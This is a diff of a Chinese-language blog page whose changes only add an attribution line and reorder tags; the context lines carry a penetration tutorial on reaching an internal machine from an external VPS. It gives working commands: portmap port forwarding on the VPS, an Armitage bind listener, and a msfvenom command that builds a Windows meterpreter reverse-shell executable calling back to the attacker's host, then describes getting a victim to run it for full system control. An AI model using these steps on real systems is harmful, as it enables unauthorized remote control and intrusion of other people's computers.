@@ -201,6 +201,8 @@
 <p>端口转发有好多方式，我这里用了最简单的一种了。：）<br>大概思路很很简单，大概思路就是：<br><strong>在vps上面进行端口转发(我在这里用的是lcx的linux版本，portmap)<br><img src="http://ofutja06x.bkt.clouddn.com/d.png" alt="forward"><br><code>./portmap -m 2 -p1 6666 -p2 8888</code><br>这里的意思就是将访问8888端口数据转发到6666端口。那么就可以让后门访问VPS的8888端口，然后本地连接VPS的6666端口，然后达到连接的目的。</strong></p>
 <h1 id="0x02-本地连接vps6666端口"><a href="#0x02-本地连接vps6666端口" class="headerlink" title="0x02 本地连接vps6666端口"></a>0x02 本地连接vps6666端口</h1><p>这里用metasploit图形化界面工具，armitage(kali里面已经集成)。直接打开，然后默认选项进去就行。下一步就是连接VPS了，选择：<strong>armitage-&gt;listeners-&gt;bind</strong><br><img src="http://ofutja06x.bkt.clouddn.com/armitage1.jpg" alt="armitage"><br>在这里，HOST写你的VPS的IP，PORT写6666,shell类型选择meterpreter，可以看到，已经连接上去。<br><img src="http://ofutja06x.bkt.clouddn.com/link1.jpg" alt="link"></p>
 <h1 id="0x03-生成后门，靶机测试。"><a href="#0x03-生成后门，靶机测试。" class="headerlink" title="0x03 生成后门，靶机测试。"></a>0x03 生成后门，靶机测试。</h1><p>免杀用Veil，这里就不用了，简单测试一下，就用msfvenom。命令如下：<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=8888 -f exe &gt; /home/xnianq/test.exe</code><br><img src="http://ofutja06x.bkt.clouddn.com/msfvenom1.jpg" alt="msf"><br>这样已经生成了一个后门，LPORT就是8888端口。<br><img src="http://ofutja06x.bkt.clouddn.com/exe.png" alt="exe"><br>下面就是让被攻击者打开后门，然后得到他的系统权限。<br><img src="http://ofutja06x.bkt.clouddn.com/attack.jpg" alt="attack"><br>这已经拿到了他的系统权限，so，你就可以为所欲为了～ ：）<br>大牛尽情喷～欢迎找我喷～<br>QQ：85903963<br><strong><em>转载请注明出处。</em></strong></p>
+<hr>
+<p>本文出自”xnianq Blog”：www.xnianq.cn/2016/10/29/内网msf连接外网机器/</p>
 
       
 
@@ -463,15 +465,15 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">pentest</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">crypto</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">pentest</a>
               </li>
              
               <li class="article-tag-list-item">
